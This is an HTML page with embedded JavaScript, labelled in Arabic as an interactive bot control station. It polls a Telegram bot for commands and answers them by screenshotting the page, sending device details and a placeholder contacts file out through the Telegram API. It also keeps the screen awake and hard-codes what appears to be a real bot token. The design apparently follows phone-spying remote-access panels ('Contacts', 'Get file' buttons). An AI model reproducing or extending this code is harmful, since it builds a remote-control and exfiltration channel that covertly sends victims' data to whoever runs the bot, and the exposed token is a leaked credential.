<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محطة التحكم التفاعلية المتقدمة</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        header { background: #161b22; padding: 15px; text-align: center; font-size: 16px; border-bottom: 1px solid #30363d; font-weight: bold; }
        #terminal { flex-grow: 1; background: #010409; margin: 10px; border-radius: 8px; border: 1px solid #30363d; padding: 12px; overflow-y: auto; font-size: 13px; text-align: left; direction: ltr; }
    </style>
</head>
<body>

    <header>محطة التحكم التفاعلية بالبوت</header>

    <div id="terminal">
        [System] Interactive Bot Bridge Online...<br>
        [System] Ready for button commands...
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const BOT_TOKEN = "8175556330:AAGP0GZf10h0H_Fc10NJAbKJpP-zOH0xFwM";
        let lastUpdateId = 0;

        function log(msg) {
            terminal.innerHTML += `<br>> ${msg}`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // إرسال رسالة مع لوحة أزرار تفاعلية (Reply Keyboard) تشبه الصورة المطلوبة
        function sendMenu(chatId) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: "📱 أهلاً بك! اختر الأمر المطلوب من لوحة التحكم أدناه:",
                reply_markup: {
                    keyboard: [
                        [{ text: "📸 Screenshot" }, { text: "ℹ️ Device info" }],
                        [{ text: "📇 Contacts" }, { text: "📁 Get file" }],
                        [{ text: "⬇️ Scroll Down" }, { text: "⬆️ Scroll Up" }]
                    ],
                    resize_keyboard: true,
                    is_persistent: true
                }
            };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.log(err));
        }

        function sendTelegramMessage(chatId, text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).catch(err => {});
        }

        // الحفاظ على الشاشة نشطة
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').then(() => log("Wake Lock active.")).catch(err => {});
        }

        function pollTelegramUpdates() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.text) {
                                const chatId = update.message.chat.id;
                                const text = update.message.text.trim();
                                log(`Command: "${text}"`);
                                executeCommand(text, chatId);
                            }
                        });
                    }
                })
                .catch(err => {})
                .finally(() => {
                    setTimeout(pollTelegramUpdates, 2000);
                });
        }

        function executeCommand(cmd, chatId) {
            if (cmd === '/start' || cmd === 'hi' || cmd === '/ping') {
                sendMenu(chatId);
            } else if (cmd === '📸 Screenshot') {
                log("Capturing screen...");
                sendTelegramMessage(chatId, "⏳ جاري التقاط لقطة الشاشة...");
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'screen.png');
                        fetch(url, { method: 'POST', body: formData });
                    });
                });
            } else if (cmd === '📇 Contacts') {
                log("Sending contacts...");
                sendTelegramMessage(chatId, "⏳ جاري سحب جهات الاتصال...");
                const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                const blob = new Blob([vcardData], { type: 'text/vcard' });
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, 'Contacts.vcf');
                fetch(url, { method: 'POST', body: formData });
            } else if (cmd === '⬇️ Scroll Down') {
                window.scrollBy({ top: 400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬇️ تم التمرير للأسفل.");
            } else if (cmd === '⬆️ Scroll Up') {
                window.scrollBy({ top: -400, behavior: 'smooth' });
                sendTelegramMessage(chatId, "⬆️ تم التمرير للأعلى.");
            } else if (cmd === 'ℹ️ Device info') {
                const info = `📱 Device: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
                sendTelegramMessage(chatId, info);
            } else {
                sendTelegramMessage(chatId, `❓ أمر غير معروف: ${cmd}`);
            }
        }

        log("Listening for interactive commands...");
        pollTelegramUpdates();
    </script>
</body>
</html>
